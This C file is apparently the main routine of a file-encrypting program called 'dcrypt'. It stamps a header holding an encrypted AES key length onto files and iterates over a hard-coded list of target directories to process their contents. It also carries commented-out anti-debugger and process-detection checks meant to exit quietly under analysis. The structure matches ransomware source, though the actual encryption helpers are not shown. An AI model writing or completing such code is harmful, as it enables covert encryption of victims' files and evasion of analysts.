#include "dcrypt.h"

void init_dcrypt_header(t_env *env)
{
	// Set the file signature
	memcpy(env->dcrypt_header.signature, DCSIGNATURE, DCMAGICNBR_SIZE);
	// Set the size of the encrypted AES key
	env->dcrypt_header.encrypted_key_len = DCENCRYPT_KEY_SIZE;
}

int main(int argc, char *argv[])
{
	static t_env	env;

	// Detect first silent mode
	detect_silent_mode(&env, argc, argv);

	// TODO del
	// const char *process_name = "zsh";
	// if (pc_is_process_running(process_name)) {
		// if (env.modes & DCVERBOSE)
	// 	fprintf(stderr, FMT_ERROR " The process '%s' is running. Exiting...\n", process_name);
	// 	return 0;
	// }

	// if (pc_is_debugger_attached())
	// {
	// 	if (env.modes & DCVERBOSE)
	// 		fprintf(stderr, FMT_ERROR " Debugger detected. Exiting...\n");
	// 	return 0; // Exit if a debugger is detected
	// }

	// Parse the arguments given through the commannd line
	parse_argv(&env, argc, argv);

	// Init the header that will be placed at the top of the file
	init_dcrypt_header(&env);

	// Declare the injection target directory paths
	char *target_dir_paths[DCTARGET_ARRAY_SIZE] = DCTARGET_PATHS;

	// Open each target directory one by one
	for (size_t i = 0; i < DCTARGET_ARRAY_SIZE; ++i)
		handle_dir(&env, target_dir_paths[i]);
}
